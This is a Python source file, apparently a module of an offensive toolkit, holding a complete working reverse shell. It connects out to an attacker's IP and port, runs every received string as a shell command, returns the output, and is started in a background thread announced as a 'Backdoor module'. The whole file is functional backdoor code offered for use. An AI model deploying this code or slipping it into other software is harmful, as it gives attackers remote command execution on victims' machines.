###########################################################################################################################
####################################################     LIBRARIES     ####################################################
###########################################################################################################################

import threading
import socket
import subprocess

###########################################################################################################################
#################################################     INITIALIZATIONS     #################################################
###########################################################################################################################


def reverse_shell(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.sendall(b"Connected.\n")

        while True:
            data = s.recv(1024).decode()
            # close connexion when 'exit' is sent
            if data.strip().lower() == "exit":
                break
            proc = subprocess.Popen(
                data,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
            )
            stdout_value = proc.stdout.read() + proc.stderr.read()
            s.send(stdout_value or b"No output\n")

    except Exception as e:
        s.sendall(f"Error: {e}\n".encode())
    finally:
        s.close()


###########################################################################################################################
#####################################################     PROGRAM     #####################################################
###########################################################################################################################


def run(atk_ip: str, atk_port: int):
    success = False
    print("[+] Backdoor module activated!")

    thread = threading.Thread(target=reverse_shell, args=(atk_ip, atk_port))
    thread.start()

    success = True
    return success
